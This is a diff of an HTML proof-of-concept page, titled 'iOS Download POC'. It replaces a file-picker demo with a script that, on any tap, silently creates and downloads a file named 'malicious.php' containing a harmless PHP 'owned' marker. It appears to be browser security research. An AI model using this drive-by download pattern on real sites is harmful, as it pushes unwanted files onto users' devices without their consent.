@@ -1,48 +1,53 @@
-<!DOCTYPE html>
-<html lang="en">
+<!doctype html>
+<html>
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Chrome iOS File Picker POC</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>iOS Download POC</title>
 <style>
-  body { font-family: sans-serif; text-align: center; padding-top: 50px; }
-  button { font-size: 16px; padding: 10px 20px; }
+  body {
+    height: 100vh;
+    margin: 0;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    font-family: sans-serif;
+    background: #fafafa;
+    cursor: pointer;
+  }
+  h1 {
+    text-align: center;
+    max-width: 420px;
+  }
 </style>
 </head>
 <body>
 
-<h1>Open File Picker in New Tab (Chrome iOS)</h1>
-<button id="openPicker">Open File Picker</button>
+<h1>
+Tap anywhere.<br>
+iOS will download a file.
+</h1>
 
 <script>
-document.getElementById('openPicker').onclick = () => {
-  // Must be inside click handler
-  const newTab = window.open('', '_blank');
+document.addEventListener('click', () => {
+  const payload = `<?php echo "owned"; ?>`;
 
-  // Add content in the new tab
-  newTab.document.write(`
-    <html>
-      <head>
-        <title>Select a File</title>
-      </head>
-      <body style="font-family:sans-serif; text-align:center; padding-top:50px;">
-        <h2>Tap below to select a file</h2>
-        <input type="file" id="fileInput" style="font-size:16px;" />
-        <script>
-          const input = document.getElementById('fileInput');
-          input.addEventListener('change', (event) => {
-            const file = event.target.files[0];
-            if (file) {
-              alert('Selected file: ' + file.name);
-            }
-          });
-        <\/script>
-      </body>
-    </html>
-  `);
+  const blob = new Blob([payload], {
+    type: 'application/octet-stream'
+  });
 
-  newTab.document.close();
-};
+  const url = URL.createObjectURL(blob);
+
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = 'malicious.php'; // iOS will still offer download
+  document.body.appendChild(a);
+  a.click();
+
+  setTimeout(() => {
+    URL.revokeObjectURL(url);
+    a.remove();
+  }, 1000);
+}, { once: true });
 </script>
 
 </body>
